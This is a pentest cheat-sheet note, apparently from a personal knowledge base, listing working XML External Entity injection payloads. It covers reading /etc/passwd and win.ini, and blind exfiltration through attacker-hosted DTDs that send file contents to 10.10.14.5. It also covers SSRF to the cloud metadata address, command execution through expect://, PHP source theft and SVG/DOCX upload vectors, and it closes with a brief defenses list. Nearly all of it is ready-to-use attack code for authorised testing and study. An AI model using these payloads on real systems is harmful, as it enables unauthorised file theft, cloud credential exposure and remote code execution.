---
tags: [pentest, xxe, xml, web, initial-access]
phase: 5
---
# XXE Payloads

XML External Entity injection: tell the parser to fetch external entities and embed them in output.

[[06 - Gaining Access/00 - README|Folder index]]

## When to look for XXE

App accepts XML input:

- SOAP / WSDL endpoints
- SAML responses
- XML upload (DOCX, SVG, RSS, OOXML formats)
- API endpoints with `Content-Type: application/xml`
- "Import config" / "Import XML" features

## Standard payload (read file)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

For Windows targets:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xxe;</foo>
```

## OOB XXE (blind - no response output)

Server fetches a remote DTD from you, sends the data over HTTP/FTP:

Host `exfil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfil_value SYSTEM 'http://10.10.14.5/?d=%file;'>">
%exfil;
```

Then inject:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://10.10.14.5/exfil.dtd"> %ext;]>
<foo>&exfil_value;</foo>
```

Or with single-quotes encoded (because XML doesn't allow `%` inside an entity in some parsers):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % p SYSTEM "http://10.10.14.5/x.dtd">
  %p;
]>
<r>&send;</r>
```

`x.dtd` on attacker:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY send SYSTEM 'http://10.10.14.5/?d=%data;'>">
%param1;
```

## SSRF via XXE

When file:// is blocked, try http:// → port scan / cloud metadata:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

## RCE via PHP wrappers

If target is PHP, `expect://` wrapper enables RCE:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>
```

(Rare - requires `expect://` extension loaded.)

## Read PHP source

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
<foo>&xxe;</foo>
```

Then base64-decode the output → PHP source.

## XInclude (when you control only part of the doc)

If you can't replace the root, use XInclude:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

## File upload XXE - SVG / DOCX / XLSX

### SVG (image uploads often accept SVG)

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload as `image.svg`, view the rendered image - the text contains the file content.

### DOCX / XLSX

These are ZIPs containing XML. Edit `word/document.xml` (or any internal XML) to add an `<!DOCTYPE>` and entity, then re-zip and upload.

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| Parser errors when injecting `<!DOCTYPE>` | DTDs blocked. Try XInclude. |
| Output is HTML-encoded | Wrap result in CDATA or use OOB exfil. |
| `expect://` not available | Try `php://filter` for source read. |
| Server doesn't include response in output | OOB DTD trick. |

## Defenses (what to recommend in your report)

- Disable external entity resolution in the parser (varies by library).
- Use JSON instead of XML where possible.
- Whitelist allowed DTDs / disable DOCTYPE entirely.

> [!tip] First test: error vs reflection
> Inject `<!DOCTYPE foo [<!ENTITY xxe "REPLACE_ME">]><foo>&xxe;</foo>` - if the response contains "REPLACE_ME", entities are being resolved. Now upgrade to file://.
